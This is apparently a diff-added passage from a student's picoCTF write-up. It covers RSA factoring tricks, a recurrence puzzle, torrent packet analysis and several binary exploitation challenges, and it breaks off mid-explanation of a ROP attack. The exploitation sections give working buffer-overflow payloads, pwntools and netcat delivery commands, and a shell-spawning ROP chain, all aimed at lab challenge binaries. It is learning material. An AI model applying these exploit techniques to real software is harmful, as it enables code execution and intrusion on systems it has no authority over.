+        applicable law.
+
+        ctf-player@challenge:~$
+    I typed in ls to find out what files were in the directory, and it looks like the flag.txt file was in it. 
+    With that, I used cat to find the contents of the file, and I was able to get the flag: picoCTF{k3y_5l3u7h_dc01cec5}
+
+Sum-O-Primes(C):
+    This flag was more unclear than the others. I decided to use a bit of math to figure out some possible equations
+    to possibly find out the primes needed for decryption. With the information given in the problem I was able to get
+    these values:
+        x = 0x198e800b4f9e29e69889bc7a42b92dbd764cb22dbeb5fb81b1d9778bfe8c4b85d08a7f990019d537b6856aa1ff7355d0bef66c0a5c954bb4b7e58ac094c42ac1c23d23f8f763e41bbebdfa985505ab3571f8355290d2ca66ac333c4e30f1b7354c37d67db2c13c7e07ca3b6d98283f5042a55e23796ca227f428e0d3a83057510
+        n = 0xa0ab034d978fdd92e73f3f7536f4f2ff5f4dee70b5f1d319903ec65f2a8ffe729688452d2c1f25a7c330e6bb532580094196f888a20ba7556f0907d8a4884bddbde4c4361582fcf163799a0f49b9d196b32012e1b5a4dabd2a6c9e9a47173f903ae1ebe2db66ebf55471982d52e6cbeb8060dd0f01d950a30ac5a830ad2414c86f97703717752bd20abb528f7738e010a7c3e8116b2c3a6706d900d83ff4afc7ca8b47f6c19d1de00c7ea8666c617a5e33d600b381b263662ad17a5d4262a819a57b357fee702538355ee7723f9c694a3c98999bc2432658c7798119d7a54d5e4c01447c7afcdf36110be0be195cea0828b17f5e86b4702341e7a37babb3db07
+        c = 0x497f4e814e3d7093d49c33c9b743748455b82496af6a8900e6d3c899b58a5e8d32fde34dccf882a87859d8508a18fe23088c8b58dd33decb3e9f4c1737c85f0b66114e62efe0da72fcee95619e4d76e7c485f161464f7067237bbcc213bd02b5e2816208333146652395e07f4245dfd654755417d35cc0a27933dd48ab219f31ed73820087c1ec7e2150caf4f5f0de052d14a2e492715e3a3ca24de41240d49494532b4d5fa54c59db08c6d94938f33a489c24a9b4a7d6b2d57164ce7aacdd0707302fded17671d197485c764064ed97d2560274b5ed4994446e8f790e16e05e8dd4b2d39e228a715f70bd012eb7eaec65e67734fad95f55be307e26b2106226
+        e = 0x10001
+    These are hexadecimal values, and can be converted into integers. Once I had that sorted out, I decided to do some 
+    simultaneous equations to figure out the possible algorithm to get the primes. Since we have both the sum and the
+    product of the primes, we can figure that:
+        p + q = x (sum of the primes)
+        pq = n (product of the primes)
+    I decided to do elimination with variable q, so that I can find out what p is. Once I solve p, I could solve for q by
+    doing: 
+        n/p = q
+    With making q the subject of the 2 equations I found that:
+        q = x - p
+        q = n/p
+    I can make it so that:
+        x - p = n/p
+    which is due to both values being equivalent variable q. With some algebra, I was able to turn the equation into a
+    quadratic. Here were my steps:
+        x - p = n/p
+            p(x - p = n/p)
+        px - p^2 = n
+            + p^2 - px
+        p^2 - xp + n = 0
+    I found that this was a quadratic equation(standard form), which because I have all of the coefficients, I can use the
+    quadratic formula to solve for p. In this case, I would be putting the values in terms of the variables into the 
+    formula such that(p in terms of x and n):
+             x + (x^2-4n)^(1/2)
+        p = --------------------
+                    2
+    Using this I was able to put these values into a function in python:
+        def quadratic_eq(a, b, c):
+            return (-b + iroot(b**2 - 4*a*c, 2)[0])//(2*a)
+    I put the values of the coefficients in the function and I solved for variable p:
+        p = 161749429556222116848076898175890045343695020811889789310642406072981974418226816737510451819428124725100350873709857018958059747985259589286894156774147750021081677541626407361407441784517046578136001286376035902065460778342842546096957253478986039046139131214800852488780530340489359699975599920445244425139
+    Since I know that n/p = q, I could also solve variable q:
+        q = 125394311779340487791199901162026557051461614906795011223163560710629908216596754081059720549497028275825348843320403065744238218804275718152634944895327127037260388923111346398615163063784803748287612455648597681602167244281188176484278415540213107535193439007749748790124920127045193879513120171063349588317
+    I did more digging in RSA and I saw that there needed to be an extra math equation to help decryption. It is taken from
+    the Euler phi function which in practice is:
+        phi = (p - 1) * (q - 1)
+    I also need to find out what variable d is to find the inverse modular of e and phi. This can be written in python:
+        d = pow(e, -1, phi)
+    This allows for the decryption to take place, as the formula for RSA decryption is:
+        flag = c^d mod n
+    With all of this information, I am able to write the following python script:
+        from gmpy2 import iroot
+        from Crypto.Util.number import long_to_bytes
+        x = 0x198e800b4f9e29e69889bc7a42b92dbd764cb22dbeb5fb81b1d9778bfe8c4b85d08a7f990019d537b6856aa1ff7355d0bef66c0a5c954bb4b7e58ac094c42ac1c23d23f8f763e41bbebdfa985505ab3571f8355290d2ca66ac333c4e30f1b7354c37d67db2c13c7e07ca3b6d98283f5042a55e23796ca227f428e0d3a83057510
+        n = 0xa0ab034d978fdd92e73f3f7536f4f2ff5f4dee70b5f1d319903ec65f2a8ffe729688452d2c1f25a7c330e6bb532580094196f888a20ba7556f0907d8a4884bddbde4c4361582fcf163799a0f49b9d196b32012e1b5a4dabd2a6c9e9a47173f903ae1ebe2db66ebf55471982d52e6cbeb8060dd0f01d950a30ac5a830ad2414c86f97703717752bd20abb528f7738e010a7c3e8116b2c3a6706d900d83ff4afc7ca8b47f6c19d1de00c7ea8666c617a5e33d600b381b263662ad17a5d4262a819a57b357fee702538355ee7723f9c694a3c98999bc2432658c7798119d7a54d5e4c01447c7afcdf36110be0be195cea0828b17f5e86b4702341e7a37babb3db07
+        c = 0x497f4e814e3d7093d49c33c9b743748455b82496af6a8900e6d3c899b58a5e8d32fde34dccf882a87859d8508a18fe23088c8b58dd33decb3e9f4c1737c85f0b66114e62efe0da72fcee95619e4d76e7c485f161464f7067237bbcc213bd02b5e2816208333146652395e07f4245dfd654755417d35cc0a27933dd48ab219f31ed73820087c1ec7e2150caf4f5f0de052d14a2e492715e3a3ca24de41240d49494532b4d5fa54c59db08c6d94938f33a489c24a9b4a7d6b2d57164ce7aacdd0707302fded17671d197485c764064ed97d2560274b5ed4994446e8f790e16e05e8dd4b2d39e228a715f70bd012eb7eaec65e67734fad95f55be307e26b2106226
+        e = 0x10001
+        def quadratic_eq(a, b, c):
+            return (-b + iroot(b**2 - 4*a*c, 2)[0])//(2*a)
+        p = quadratic_eq(1, -x, n)
+        q = n//p
+        phi = (p - 1) * (q - 1)
+        d = pow(e, -1, phi)
+        flag = long_to_bytes(pow(c, d, n))
+        print(flag)
+    This was able spit out the flag, and with despite my Grade 9 Extended Math knowledge am I able to get this flag of
+    this RSA challenge: picoCTF{ee326097}
+
+Very Smooth(C):
+    With another mathematical cryptography problem, comes the need for more research. Using the hint pointed me towards 
+    Pollard's p - 1 algorithm, which theorizes that the gcd of the inverse modulus operation of the defining base and 
+    exponent minus one and n will result in a smooth prime factor of n. Using logic and formulas from the Sum-O-Primes
+    problem can allow me to be able to find, q, phi and d with ease as long as I have p. In this case, I decided to make
+    the defining base to be 2, and the defining exponent to be !100000(factorial). I can have the modulus be n(which makes
+    the operation of: (2^!100000) mod n). I need to subtract this value by 1 to remain using the Pollard algorithm, and 
+    find the greatest common divisor of that number and n. I can write the algorithm as such:
+        def pollards():
+            factorial = 1
+            for i in range(1, 100000):
+                factorial *= i
+            return gcd(pow(2, factorial, n) - 1, n)
+    The function essentially follows the operation of:
+        p = gcd((((2^!100000) mod n) - 1), n)
+    This follows the Pollard's p - 1 algorithm, and allows me to solve for p. Using the other formulas that can be used
+    universally across the RSA algorithm, I can create a script that allows me to get the flag:
+        from Crypto.Util.number import long_to_bytes, inverse
+        from gmpy2 import gcd
+        n = 0x6c22f986f42070bffcb20cde5f2b177d7e7e0aa27da9d8bff6878ca2e20decc536415464f3421b566c99b3a847563356274742960fec72f23159598a485cc1c4b14fbb06663e9216a2155dcb467eabd376af03046e1388100f30dd45110bc1a0d83cd61e601056bf4c2f7c218bb9f7092d55404ad5d1972816d0c99b1afb3891848a8149a10c1712f5aa5063b89f916258b6c7aab25199bdda4dd3bbb41861b6abe22fad20533768e9669ec724536b8edf136334817f0eb1ed7521de10fba7e57adf6a186ea507f8c4beff0bb257ba5ffca31099d1b0585adca615cc55db717e8cd368a4ddfde79c84fb4daaec9fa98af61af9351640f971098f5739101f9901
+        c = 0x5f1b83489ccf5b6e7c61deeb9a153caea3a8db74ef7c408b69e7e31c65ed8cf0507be40eccf6e1d0aaacefb01e9c10b4051faa6186a04c517ed92f8b394ea024a1cdf500d4ffa8f00377cf63d14ad301b9112b63fa136e7c4bbef050154da3206d26f9d85987d73cf22d2648cd18c8641de25bbb01f84105b8df327616eb8f68d3ef1d5b5271b411564cd1ff04ee975a19a2cfeb87f1cbed0cf131501d966ec8bb6dcd3f43939e987d52c25b36326f02cfa542fc393c87e49b682faf8262621d89714271e22adb189530574140a68aa518d6133115a573f534ab577dadd04fcffb742cb186d7c75f640e0f21fcb9273745a0d4f60916c117717b0bab3ebd1fd
+        e = 0x10001
+        def pollards():
+            factorial = 1
+            for i in range(1, 100000):
+                factorial *= i
+            return gcd(pow(2, factorial, n) - 1, n)
+        p = pollards()
+        q = n//p
+        phi = (p - 1) * (q - 1)
+        d = inverse(e,phi)
+        flag = long_to_bytes(pow(c, d, n)).decode()
+        print(flag)
+    Once running this script, I am able to get the flag: picoCTF{7579cc73}
+    
+X-sixty-what(BE):
+    Looking at the source code, this problem seemed to be just like Buffer Overflow1, but with a twist.
+    With the knowledge from pwntools that I learned, I decided to use the same exploit of BO1, but I of
+    course needed to see how many bytes would overflow the buffer. This can of course be figured out when
+    the script returns a segmentation fault which happens when the buffer has been overflowed. This number 
+    turned out to be 64. I also read the hint, which stated that I should use the second function that was
+    after the first push. Before I created the python script, I ran gdb to figure out the address of that
+    function. This is what I got:
+        │  0x401220 <__do_global_dtors_aux+32>     ret                                   │
+        │  0x401221 <__do_global_dtors_aux+33>     data16 cs nopw 0x0(%rax,%rax,1)       │
+        │  0x40122c <__do_global_dtors_aux+44>     nopl   0x0(%rax)                      │
+        │  0x401230 <frame_dummy>                  endbr64                               │
+        │  0x401234 <frame_dummy+4>                jmp    0x4011c0 <register_tm_clones>  │
+        │  0x401236 <flag>                         endbr64                               │
+        │  0x40123a <flag+4>                       push   %rbp                           │
+        │  0x40123b <flag+5>                       mov    %rsp,%rbp                      │
+        │  0x40123e <flag+8>                       sub    $0x50,%rsp                     │
+        │  0x401242 <flag+12>                      lea    0xdbf(%rip),%rsi               │
+        │  0x401249 <flag+19>                      lea    0xdba(%rip),%rdi               │
+    This allowed me to figure out that the return address of the flag function that would print out the flag
+    was at '0x0040123b'. Afterwards, I used python to create a script that looks like:
+        from pwn import *
+        payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+        e = ELF("./vuln")
+        addr = e.symbols['win']
+        returnaddr = payload+p64(addr)
+        r = remote("saturn.picoctf.net",57552)
+        r.sendline(returnaddr)
+        r.interactive()
+    While this had much resemblance to the exploit from the first buffer overflow, it seems the machine 
+    running the script was different(in the sense that it was using 64 bit, not 32), and I decided
+    to add some more a's to then test to see if it were to work. I used gdb to help me with this, and
+    I created the dummy payload containing a selected amount of a's and followed by some b's to show
+    whether the EIP has been fully overwritten or not. Once I got to 72 a's and 4 b's the script worked 
+    in overwriting the EIP:
+        Welcome to 64-bit. Give me a string that gets you the flag: 
+
+        Program received signal SIGSEGV, Segmentation fault.
+        0x0000000062626262 in ?? ()
+    and the declaration of the payload variable was:
+        payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    This did not work, so I changed the return address to 0x0040123b(addr variable) and I reran the script. 
+    Once I ran the script, the output looked something like this:
+        [+] Opening connection to saturn.picoctf.net on port 57552: Done
+        [*] Switching to interactive mode
+        Welcome to 64-bit. Give me a string that gets you the flag: 
+        picoCTF{b1663r_15_b3773r_a0428cd7}
+    This was able to print out the flag itself, and my exploit had worked.
+
+Sequences(C):
+    Since I had much difficulty with attempting tail recursion, and other methods that would try and optimise
+    the python script, I opted to cheese it with good ol' Wolframalpha. Since the function given looks like 
+    this:
+        def m_func(i):
+            if i == 0: return 1
+            if i == 1: return 2
+            if i == 2: return 3
+            if i == 3: return 4
+
+            return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1)
+    I decided to turn it into something like:
+        f(x) = 55692f(x-4) - 9549f(x-3) + 301f(x-2) + 21f(x-1)
+    Putting that into Wolframalpha, I was able to get:
+        f(x) = (1612 (-21)^x + 30685 2^(2 x + 5) 3^x - 1082829 13^x + 8349 17^(x + 1))/42636
+    With given values 2e7 and 10^10000, I needed to solve the function with x = 2e7, and modulating that by 10^10000 
+    to get the solution, which was a very large number(10000 digits). Using the given solution I can solve the problem
+    without needing to run the function with python:
+        import hashlib
+        import sys
+        ITERS = int(2e7)
+        VERIF_KEY = "96cc5f3b460732b442814fd33cf8537c"
+        ENCRYPTED_FLAG = bytes.fromhex("42cbbce1487b443de1acf4834baed794f4bbd0dfb78a053d258da7c42b")
+        def m_func(i):
+            if i == 0: return 1
+            if i == 1: return 2
+            if i == 2: return 3
+            if i == 3: return 4
+
+            return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1)
+        def decrypt_flag(sol):
+            sol = sol % (10**10000)
+            sol = str(sol)
+            sol_md5 = hashlib.md5(sol.encode()).hexdigest()
+
+            if sol_md5 != VERIF_KEY:
+                print("Incorrect solution")
+                sys.exit(1)
+
+            key = hashlib.sha256(sol.encode()).digest()
+            flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode()
+            print(flag)
+        if __name__ == "__main__":
+            sol = 9255992309255409483179419845385604076174038906804435862147131271801573863364671050296589603656758794258408363769683958014335858678927280224225587045835554549236411759910608220745411090061107428308955685273979287406544038776309083120692585385738829595466109925134108641705991448085508655504450017990509268760925633701568972881830027061610560435878782702300627297929494871966955716917939371706707268015616593308156496696604916581937050769400369329646318242403439293960972797326591961508734072823394003350315417131956614413828716990680272404638311428692240287388862893111312382911200690775170712470656181173871770843346165473902020842788371815280837350600345873274612288695974628974447382548367670699187634577856102734888566085413732796006178277409299011898018586005894168842976151756634127393139021619117795598661633051521271539523878676739785948001294884571789689490927900913683983739549130273396058399143226419007679327244720322508238328094638668628927305146465933124499123166025607367183896479143811606663266607998143104781472932536517962870064142946144625397409118482948529375842470080996308940228181555868856278635118907503183008759948969042642499296992802929823117992152968592210773980077617609073992433539666043450153737078290684650605359729295102951770694711461980246093793230726069510952832108390343839058578187834443332785573981574093142883050492227667587060213520259865514144542328249027296100425783797607012578290271918793953435463360127600336995858457256850614392061752272722254154308105713290184809674001961254146687993990619053173026936872310492713720330275500652722252195618029796316172978100805935132221268612041959579928042577530526820419119584535052685904447261275310418413248686956899719552564514439618702687638343849484513674694171734435213591420260740566479490794343621991808171166760491608939159807834320688115459926363623951639944589028697445192690646124728566256342389792435969804521066155975776703867010670866905226643086877863465230710100595718033849129799770334210438392357318197622026595775013560170000581836767441557468287425384470655606044094877141189131911510528837751403182546932730981726862216771989383509234877567054461236826949390614566495105022255382856931991575044242339913426032792306478049565359457186829132169808003222243325028652626310095161166749383960092203262812957052229181656830263059054012215047216588117847290728018790343673230003332953508551258024784915192282602155534492742678877926631791253048827739564711644506014349266360429184321481406973201467494658627340758651248713537093402837529826098026053980059834955577271342991416289835227752675490374970512450046682049106507080363044373334490863015296351867206843957520897668462624524697408794293584230426162185084180656752348354284781732407856125955024240750800619775537915436516642312543485650255028594050775824329726464411065155974834914382223375359322586073472902099799870968399129353093933551117138823131500391523207862454881095643216836059114056185567621210349969346322773001970523136569586467928553922556759816995780147911338014075002398099900406865475250060061466196595711092783115852233928711362221294428465110008730032376221811390098890201357718636406741505189198093628817125780661479980043085639258408363072938360753891009465462833335469632467626044690421375033291457334660505739506576025799178496006189196177956994530824690940218609585303782913911708447438142187182926981478894626795456902176806611295290700707265838620112296859471410916725995917774332274290788363516703126067525815657749686032894240952885372190041514195745517242466094437249645852862039820489243179115296739411857999937345382824004834661340869046052653646306780119433815387152755133605774561035882025757872567705036320478601722273548057596707229169819752947743173434922514692459604659989254924691025826519889997310022991556840695569039726702142704241050410911435207616994113021032464407922133128294008095361971182034734357545845729036366311342093217648851382217300855617348105944416959797800045679106051418970936740212201243323374420621407825691038198850295142424362386735016850455273108385213347814948477424622972677362919476397615254720546530031804494636576667039213835518167079053755689483780169794708659175854750079429248450088295652150342673865847877948007025066365086867044327664549023605585607043999489198176552411509573614509346696314655265681005379692562018978024392184039921374721689942446250899039972858579928731641819612416834076914289563149490277258128048991899111474196559739496407766224802408886023880978692457886403296980175876160991944550852846912763591834524913193729446086608083228520607915228071996267423308343063134888427907517509315007222472389958749971119851036755792600655325528041204067006759701899650882688051833189752046173730379687971618778106152429359138121583193895560513945636243134471509560159959342910138282307726776095970363559666437861045509504138185181506053793512330290527298473960426572845110238171117683684041364809195193134404789631117855182678689233515561942021072691997136439472830027014623367190862026964245957075271549021475940633067620735535147002394377565757136258368893655670057033255721591133344504950327269570084772598756931676545313429328183852664697498916280009082153424970243321291245567462087352044270433243592074410354599395985297648098973502854925696106939367723393764563272258573159869455233248604794095580403785375164969409403081664991958224758441901558161776076591761888047641751838451040113125346830296747468600274844343324792391841427920168269451466724402733360927693709608962574594464579536984204944785654570365966337092840214689194020777824352704334046313881288338804180775802282603846332149028417773288289252762349196418160264959236996771411726564554602445482384874934737046588338703536104981717946192703044019694658564450098648845491774640036585262302060685132707254404537015003307098121867501852580890489939024131889401235319636551040339975967238422740240966259515037478254770473708996730051186960847990806128716407679744434499599989634137262723021472296892338440434736145378291606947957568823870560743760517351104324171646786563571781160467327443314778456838020015351241446028925489659469259191936419394977586960658145019513424973791091137643248921605946312129559765684939065366382416571402819258368193526542981160896431303284342924396162774222454806500316599596574249681068946095848501619763049813933785364480427016321396723833776401301274077949645225141713635020427987198026380348105434595680144888649570836956452691173177645938260028423349017079649855941675840603611580622678506371371697560589581420055017577346354260361897276945627730859540343204410331899938007511401885662258331200755215828320367067692873598022854726551625019874259353828693391050015840864024895999795407357598143936695574892246307842161783795560397647511274081780556477771717482679637977149078124055360544607647924994542360536953444119017948371483912417341760402319880478433679698847402873629477418088386984882884367030602730629280761454042804309591833135472741106210177450590122900331916392690960166575957302364880258370864660313841070468917976423612480270717152957780709455158756388635972782046126933529379819689066556155764477143246285455968257184500627209798685519518396787028389456612015798784443980456558550117443763642092453428667889633895366126970127595278029054151815294466903598493508152766946482827975630302463357183665021121093456732176958408682571069411703078859156168396080558652545622296864811704928778418723691428995865934077090633785666707553168035257181052413086259223364488253377812633572773449366795144005798862081976863438611157642682042555702811274364249588365217230773276938197025251263204920250274561918739940317025820821943112146326658971603405997249518942370887739428430647434654176831358048833125278711592425215074394781203447864697270631159656012070957627193840233040056721098784067686855982514452154301379396013592845015085700333286408687000310352955163502073542407384258224528062051710025286474577927921058848236668349074255824260841594925768567573318340711331715155787289165246585583291819252627720144687822781808529370613377586610735928178283327207791931897883424633325083583001975227016830407188727609132036632946234419301131666389964830321414921172514131959586030586931111249491498106713817311838283034349524325163097453961907669495483388300826404610851466022463454212313603637565042757263073095191351465395578859789289286623320311957329723105215118350211185629815472005840341390060401666302409887985194198907321230384356718336469944222033952614808736700826052596589783073153308736029332962140644960168255815809288477363038352552111837655071019625450260503418732701804784747182324638570871601380717550522471539631880754137751840248666247067558719456661594013155374353565787812302603454241932587478074531723845881852522899875520108223989565161816290836725233062170653322013442338668982907977623671041502866086951618008336554936548381992485724315445742522418652645366236207797254801446299025033667397474972659524455906539862842231515555042136670038247248897838354864879530283890881209788864080366922898130228485869246412234498989357579422587192729993196385899640805525931849963321047376078696409505210382363852446788333692920589280728231042105259768204967935237630730947289546176237344157978687526209734663065396354369435887509555819496761529612670892267592613261368154786970843333205497696978891361396207152144495001501963211406214283549677114836227070689864106611003794440829922052585114742533372193737747468840053514452728905654108384095706621378519493931924415799771055333810098449370026530525687192051298576502186041804793590285571178492574358690394687483560097079894226196628064591511497281471180947997153327377330473027002482264767742036860570511304613104070588191520523721602975179515534689251675096747888297896189014738139384973413497771956407580089944032595700454254757322594723644055223823257936218414738084433738393480670154822354418285633492955295404766761380204585025501914177392046923017909349445763892709995098736896765635526774603125001
+            decrypt_flag(sol)
+    This returned the flag of: picoCTF{b1g_numb3rs_cd8e813d}
+
+Wizardlike(RE):
+    With the very intimidating description and running the script, it seemed that all was lost and I would not be able
+    to solve the problem. Unfortunate that instead of the real method that would solve this problem, I have no idea how
+    to use the NSA's ghidra nor do I know how to use R2. I was curious so I decided to use cat to view the contents of 
+    the file, and I already found something. It seems the map textures were already there, and fragments of the flag 
+    were scattered around in ascii art text. I decided to condense my terminal to make it thinner, and it allowed me 
+    to see everything much more clearly. Here's a fragment of the flag that I was able to see with simply condensing my 
+    terminal(100 width):
+        ......#...................................
+        ....................####.#####.#####..###.
+        .####.#..###..###..#.......#...#......#...
+        .#  #.#.#....#   #.#.......#...###...#....
+        .####.#.#....#   #.#.......#...#......#...
+        .#....#..###..###...####...#...#......###.
+        .#........................................
+    This is much more clear and readable, and I proceeded to read all of the other fragments and formulate that into a
+    nice flag. In the end I was able to get the flag: picoCTF{ur_4_w1z4rd_4B0DA5A9}
+
+Wine(BE): 
+    This was a very painful problem. It took almost no time to solve it locally, however it took hours to actually 
+    solve it on the server. This was due to it using Windows instead of Linux, which made a few differences in terms of
+    the exploit. This took a lot of trial and error, and I realised I should have piped the output of the payload into
+    the netcat, instead of using pwntools, as for some reason it worked there first try. To actually make the payload,
+    I needed to know the return address of the win function. I went to using GDB, as I actually know how to use it. 
+    Looking at the assembly, I was able to find out where it was here:
+        |   0x40152e <__gcc_deregister_frame+14>    nop                          │
+        │   0x40152f <__gcc_deregister_frame+15>    nop                          │
+        │   0x401530 <win>                          push   %ebp                  │
+        │   0x401531 <win+1>                        mov    %esp,%ebp             │
+        │   0x401533 <win+3>                        sub    $0x68,%esp            │
+        │   0x401536 <win+6>                        movl   $0x404000,0x4(%esp)   │
+        │   0x40153e <win+14>                       movl   $0x404002,(%esp)      │
+        │   0x401545 <win+21>                       call   0x4026bc <fopen>      │
+        │   0x40154a <win+26>                       mov    %eax,-0xc(%ebp)       │
+        │   0x40154d <win+29>                       cmpl   $0x0,-0xc(%ebp)       │
+        │   0x401551 <win+33>                       jne    0x40156b <win+59>     │
+        │   0x401553 <win+35>                       movl   $0x40400c,(%esp)      │
+        │   0x40155a <win+42>                       call   0x402684 <puts>       │
+    The address of the win function is 0x401530, and in python that can be translated into '0x00401530'. I used pwntools
+    to convert that address into little endian(using the 'p32()' method) and I was able to convert that into this hex 
+    value:
+        0\x15@\x00
+    I decided to also find out where the buffer gets overflowed, and I did numerous tests to figure that out. With some trial 
+    and error, I was able to figure out what the offset was for the EIP to be overwritten, once I reached 140 a's followed 
+    by 4 b's:
+        drsquid-picoctf@webshell:~$ wine vuln.exe < wine.txt
+        Give me a string!
+        wine: Unhandled page fault on read access to 62626262 at address 62626262 (thread 0024), starting debugger...
+        Unhandled exception: page fault on read access to 0x62626262 in 32-bit cod
+        e (0x62626262).
+        Register dump:
+        CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
+        EIP:62626262 ESP:0064fe80 EBP:61616161 EFLAGS:00010246(  R- --  I  Z- -P-
+        )
+        EAX:0064fdf0 EBX:009b0e1c ECX:0064fd80 EDX:ffffffff
+        ESI:00000021 EDI:002316e4
+    The EIP has changed to the 4 b's showing where the redirected return address should be. I decided to create a script that 
+    generates the payload and pipe the output of the payload generation into netcat. I created a short script that allows the payload
+    generation:
+        payload = 'a'*140+'0\x15@\x00'
+        print(payload)
+    This takes the endianed return address and creates a payload containing the padding of 140 a's and the return address of the win
+    function. of them back to back. Using this, I ran the command alongside netcat, so that the output of the file would be used as 
+    input in the netcat connection(used the webshell):
+        python3 wine.py | nc saturn.picoctf.net 59559
+    Once doing so, there was a large error message that was sent back to me, however something nice came out of it too:
+        Give me a string!
+        picoCTF{Un_v3rr3_d3_v1n_266a4ad8}
+        Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).
+        Register dump:
+        CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
+        EIP:7fec3900 ESP:0064fe84 EBP:00401530 EFLAGS:00010206(  R- --  I   - -P- )
+        EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
+        ESI:00000005 EDI:006d2250
+        Stack dump:
+        0x0064fe84:  00000000 00000004 00000000 7b432ecc
+        0x0064fe94:  00230e78 0064ff28 00401386 00000002
+        0x0064fea4:  00230e70 0021d208 7bcc4625 00000004
+        0x0064feb4:  00000008 00230e70 006d2250 000e9f66
+        0x0064fec4:  18898f61 00000000 00000000 00000000
+        0x0064fed4:  0000000...
+    The flag was there near the top, and I was finally able to solve the problem after hours of trial and error.
+    Flag: picoCTF{Un_v3rr3_d3_v1n_266a4ad8}
+
+Torrent Analyze(F):
+    This is probably one of the biggest troll problems that I have solved. Before having any knowledge of the Torrent 
+    protocol, I just went through the packets one-by-one until I found something. I thought I found something here as
+    there was something interesting(a movie) in it(udp.stream eq 56):
+        00000050  5c b3 00 0d 34 3a 6e 61  6d 65 34 36 3a 5a 6f 6f   \...4:na me46:Zoo
+        00000060  20 28 32 30 31 37 29 20  37 32 30 70 20 57 45 42    (2017)  720p WEB
+        00000070  2d 44 4c 20 78 32 36 34  20 45 53 75 62 73 20 2d   -DL x264  ESubs -
+        00000080  20 4d 6b 76 48 75 62 2e  43 6f 6d 34 3a 70 6f 72    MkvHub. Com4:por
+        00000090  74 69 31 36 39 38 31 65  34 3a 73 65 65 64 69 31   ti16981e 4:seedi1
+    It turns out it was actually bait, and is just a dead end. I actually then decided to read the website provided about the 
+    Torrent protocol, and after I decided to look for packets with "peer" inside of it, to find any info hashes that might lead 
+    me to a magnet link. I kept looking and I was able to find some interesting looking hex dump, that includes information 
+    about the peer and also the info hash(udp.stream eq 135):
+        00000000  64 31 3a 61 64 32 3a 69  64 32 30 3a 17 c1 ec 41   d1:ad2:i d20:...A
+        00000010  4b 95 fc 77 5d 7d dd cb  68 66 93 b7 86 3a c1 aa   K..w]}.. hf...:..
+        00000020  39 3a 69 6e 66 6f 5f 68  61 73 68 32 30 3a e2 46   9:info_h ash20:.F
+        00000030  7c bf 02 11 92 c2 41 36  7b 89 22 30 dc 1e 05 c0   |.....A6 {."0....
+        00000040  58 0e 65 31 3a 71 39 3a  67 65 74 5f 70 65 65 72   X.e1:q9: get_peer
+        00000050  73 31 3a 74 34 3a 67 70  c7 23 31 3a 79 31 3a 71   s1:t4:gp .#1:y1:q
+        00000060  65                                                 e
+    I decided to get the hex of the info hash. This is what I got after truncating it to only 40 characters long, as magnet
+    links need to be at such a length(The hash started at e2, and ended at 0e, before a colon in the ascii text):
+        e2467cbf021192c241367b892230dc1e05c0580e
+    I put this into a link generator and I also go this:
+        magnet:?xt=urn:btih:e2467cbf021192c241367b892230dc1e05c0580e
+    With the information provided, I downloaded BitTorrent Web(yeah you should probably download it for this problem), and I 
+    put the magnet link into it and after a little bit of waiting, it said something like this:
+        Adding 1 Torrent:
+         ubuntu-19.10-desktop-amd64.iso
+         1 File, 2.46 GB
+         Peers: 110 | Seeds:146
+    According to the hint, the filename that is the flag ends with .iso, solidifying that this is the filename of the torrent
+    is actually the flag. I was able to put this into picoCTF and it worked!: picoCTF{ubuntu-19.10-desktop-amd64.iso}
+
+Ropfu(BE):
+    For this one, I used a tool to create the main payload to snatch the shell. To actually first get the code to perform the 
+    exploit, I used a tool called ROPgadget to generate such a payload. With running the command of:
+        ROPgadget --binary ./vuln --ropchain
+    This is the payload(generated for python2):
+        p = '' 
+
+        p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+        p += pack('<I', 0x080e5060) # @ .data
+        p += pack('<I', 0x41414141) # padding
+        p += pack('<I', 0x080b074a) # pop eax ; ret
+        p += '/bin'
+        p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+        p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+        p += pack('<I', 0x080e5064) # @ .data + 4
+        p += pack('<I', 0x41414141) # padding
+        p += pack('<I', 0x080b074a) # pop eax ; ret
+        p += '//sh'
+        p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+        p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+        p += pack('<I', 0x080e5068) # @ .data + 8
+        p += pack('<I', 0x41414141) # padding
+        p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
+        p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+        p += pack('<I', 0x08049022) # pop ebx ; ret
+        p += pack('<I', 0x080e5060) # @ .data
+        p += pack('<I', 0x08049e39) # pop ecx ; ret
+        p += pack('<I', 0x080e5068) # @ .data + 8
+        p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+        p += pack('<I', 0x080e5068) # @ .data + 8
+        p += pack('<I', 0x080e5060) # padding without overwrite ebx
+        p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0808055e) # inc eax ; ret
+        p += pack('<I', 0x0804a3d2) # int 0x80
+    I had to put this payload in an actual script and send it to the server, so that I could actually steal the shell. I first
+    also had to find the offset of the vulnerability to overwrite the return address(EIP) of the script. I used GDB to debug see
